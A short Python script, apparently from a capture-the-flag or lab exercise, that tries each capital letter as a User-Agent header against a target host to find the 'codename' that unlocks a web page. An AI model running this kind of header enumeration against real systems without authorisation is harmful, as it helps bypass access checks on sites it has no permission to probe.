#!/usr/env/python3
import requests
from os import getenv

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

target = getenv("ip")

for c in chars:
	r = requests.get(f"http://{target}/", headers={"user-agent": f"{c}"})
	if "Use your own <b>codename</b> as user-agent to access the site" not in r.text:
		print(f"user-agent: {c}")
		print(r.text)